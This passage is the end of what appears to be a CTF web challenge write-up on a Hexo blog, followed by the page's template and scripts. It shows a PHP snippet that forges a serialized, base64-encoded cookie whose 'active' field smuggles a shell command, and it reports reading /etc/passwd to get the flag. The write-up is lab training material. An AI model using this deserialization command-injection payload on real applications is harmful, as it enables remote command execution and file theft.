+<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;1756471575; &#x27;</span>  . <span class="hljs-variable">$command</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$u</span>)).PHP_EOL;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>I got the new cookie from the script, added it to the request, and sent it: </p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20180618.png" srcset="/img/loading.gif" lazyload></p>
+<p>The attack works! Now, by changing the command to <code>cat /etc/passwd</code>, you will successfully get the flag:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20181238.png" srcset="/img/loading.gif" lazyload alt="Flag"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/05/htb-m/code/" title="HTB Code Machine (Easy)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Code Machine (Easy)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
